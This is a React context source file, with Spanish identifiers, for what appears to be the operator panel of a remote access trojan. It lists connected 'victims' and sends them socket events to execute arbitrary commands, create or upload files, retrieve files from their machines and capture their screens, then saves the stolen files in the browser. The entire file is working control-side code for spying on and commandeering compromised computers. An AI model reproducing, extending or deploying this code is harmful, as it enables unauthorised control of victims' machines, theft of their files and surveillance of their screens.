import { createContext, useState, useEffect } from "react";
import socket from '../app/socket'; // Importa la instancia de socket

export const ContextHome = createContext();

export function ContextHomeProvider(props) {
    const [lista_clientes, setListaClientes] = useState({});
    const [respuesta_comando, setRespuestaComando] = useState('');
    const [modalShow, setModalShow] = useState(false);
    const [idVictima, setIdVictima] = useState('');
    const [respuestaArchivoCreado, setRespuestaArchivoCreado] = useState('');
    const [respuestaArchivoEnviado, setRespuestaArchivoEnviado] = useState('');
    const [respuestaArchivoRecuperado, setRespuestaArchivoRecuperado] = useState({});
    const [errorRecuperarArchivo, setErrorRecuperarArchivo] = useState('');
    const [capturaPantalla, setCapturaPantalla] = useState({});
    const [errorCaptura, setErrorCaptura] = useState('');

    const abrirModal = () => setModalShow(true);
    const cerrarModal = () => setModalShow(false);

    useEffect(() => {
        const recibirClientes = (lista) => {
            setListaClientes(prevClientes => ({ ...prevClientes, ...lista }));
        };

        const recibirRespuestaComando = (datos) => {
            setRespuestaComando(datos);
        };

        const recibirArchivoCreado = (datos) => {
            setRespuestaArchivoCreado(datos);
        };

        const recibirArchivoEnviado = (datos) => {
            setRespuestaArchivoEnviado(datos);
        };

        const recibirArchivoRecuperado = (datos) => {
            descargarArchivo(datos);
        };

        const recibirErrorArchivoRecuperado = (datos) => {
            setErrorRecuperarArchivo(datos);
        };

        const recibirCapturaPantalla = (datos) => {
            setCapturaPantalla(datos);
        };

        const recibirErrorCapturaPantalla = (datos) => {
            setErrorCaptura(datos);
        };

        socket.on('listaClientes', recibirClientes);
        socket.on('respuestaComando', recibirRespuestaComando);
        socket.on('respuestaCrearArchivo', recibirArchivoCreado);
        socket.on('respuestaArchivoEnviado', recibirArchivoEnviado);
        socket.on('recibirArchivoCliente', recibirArchivoRecuperado);
        socket.on('errorLecturaArchivo', recibirErrorArchivoRecuperado);
        socket.on('recuperarCaptura', recibirCapturaPantalla);
        socket.on('errorCapturaPantalla', recibirErrorCapturaPantalla);

        return () => {
            socket.off('listaClientes', recibirClientes);
            socket.off('respuestaComando', recibirRespuestaComando);
            socket.off('respuestaCrearArchivo', recibirArchivoCreado);
            socket.off('respuestaArchivoEnviado', recibirArchivoEnviado);
            socket.off('recibirArchivoCliente', recibirArchivoRecuperado);
            socket.off('errorLecturaArchivo', recibirErrorArchivoRecuperado);
            socket.off('recuperarCaptura', recibirCapturaPantalla);
            socket.off('errorCapturaPantalla', recibirErrorCapturaPantalla);
        };
    }, []);

    const ejecutarComando = (idVictima, comando) => {
        socket.emit('ejecutarComando', { idVictima, comando });
    };

    const crearArchivo = (idVictima, nombre, contenido) => {
        socket.emit('crearArchivo', { idVictima, nombre, contenido });
    };

    const enviarArchivo = (idVictima, archivo) => {
        socket.emit('enviarArchivo', { idVictima, archivo });
    };

    const recuperarArchivo = (idVictima, ruta) => {
        socket.emit('recuperarArchivo', { idVictima, ruta });
    };

    const capturarPantalla = (idVictima, opcion) => {
        socket.emit('capturar_pantalla', { idVictima, opcion });
    };

    const descargarArchivo = (datos) => {
        const byteCharacters = atob(datos.contenido);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: "application/octet-stream" });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = datos.nombre;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(link.href);
    };

    return (
        <ContextHome.Provider value={{
            lista_clientes,
            modalShow,
            idVictima,
            setIdVictima,
            abrirModal,
            cerrarModal,
            respuesta_comando,
            ejecutarComando,
            respuestaArchivoCreado,
            crearArchivo,
            respuestaArchivoEnviado,
            enviarArchivo,
            respuestaArchivoRecuperado,
            recuperarArchivo,
            errorRecuperarArchivo,
            capturarPantalla,
            capturaPantalla,
            errorCaptura
        }}>
            {props.children}
        </ContextHome.Provider>
    );
}
